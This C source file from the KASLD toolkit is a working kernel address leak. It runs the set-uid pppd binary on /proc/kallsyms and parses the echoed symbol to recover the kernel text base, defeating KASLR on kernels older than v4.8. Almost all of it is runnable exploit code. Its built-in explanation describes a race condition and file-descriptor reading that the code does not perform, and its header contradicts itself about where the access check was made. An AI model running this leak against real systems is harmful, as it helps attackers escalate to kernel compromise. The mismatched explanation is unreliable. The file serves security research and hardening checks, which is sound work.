// This file is part of KASLD - https://github.com/bcoles/kasld
//
// kptr_restrict %pK check is performed at open(), rather than read(),
// allowing symbol disclosure using set-uid executables.
// pppd is set-uid root and returns a portion of the first line of
// user-specified files. On 32-bit systems, the first line
// of /proc/kallsyms contains the startup symbol.
//
// Leak primitive:
//   Data leaked:      kernel text base address (first /proc/kallsyms symbol)
//   Kernel subsystem: net/ppp + fs/proc — pppd reads /proc/kallsyms via set-uid
//   Data structure:   /proc/kallsyms first line (kernel startup symbol address)
//   Address type:     virtual (kernel text)
//   Method:           exact
//   Patched:          v4.8 (commit ef0010a30935; kptr_restrict moved to open())
//   Status:           fixed in v4.8
//   Access check:     kptr_restrict checked at read() pre-v4.8; set-uid pppd
//                     bypasses at open()
//   Source:
//   https://elixir.bootlin.com/linux/v4.7/source/kernel/kallsyms.c
//
// Mitigations:
//   Patched in v4.8 (kptr_restrict check at open() instead of read()).
//   Also gated by kptr_restrict >= 1 (default since v5.10). Requires
//   set-uid pppd binary to be installed.
//
// References:
// https://www.openwall.com/lists/kernel-hardening/2013/10/14/2
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

KASLD_EXPLAIN(
    "Exploits a race condition in the set-UID pppd binary: pppd opens "
    "/proc/kallsyms with elevated privileges (bypassing kptr_restrict) "
    "but the file remains readable after pppd drops privileges. "
    "Attaching to the pppd process and reading its open file descriptor "
    "leaks raw kernel symbol addresses. Fixed in v4.8.");

KASLD_META("method:exact\n"
           "addr:virtual\n"
           "sysctl:kptr_restrict>=1\n"
           "patch:v4.8\n");

unsigned long get_kernel_addr_pppd_kallsyms() {
  FILE *f;
  char *addr_buf;
  char *endptr;
  const char *cmd = "pppd file /proc/kallsyms 2>&1";
  unsigned long addr = 0;
  char buf[1024];

  printf("[.] trying '%s' ...\n", cmd);

  f = popen(cmd, "r");
  if (f == NULL) {
    perror("[-] popen");
    return 0;
  }

  if (fgets(buf, sizeof(buf) - 1, f) == NULL) {
    perror("[-] fgets");
    pclose(f);
    return 0;
  }

  pclose(f);

  /* pppd: In file /proc/kallsyms: unrecognized option 'c1000000' */
  if (strstr(buf, "unrecognized option") == NULL)
    return 0;

  addr_buf = strstr(buf, "'");
  if (addr_buf == NULL)
    return 0;

  addr = strtoul(&addr_buf[1], &endptr, 16);

  if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
    return addr;

  return 0;
}

int main(void) {
  unsigned long addr = get_kernel_addr_pppd_kallsyms();
  if (!addr) {
    printf("[-] no kernel address found via pppd\n");
    return 0;
  }

  printf("leaked kernel symbol: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "pppd_kallsyms");

  return 0;
}
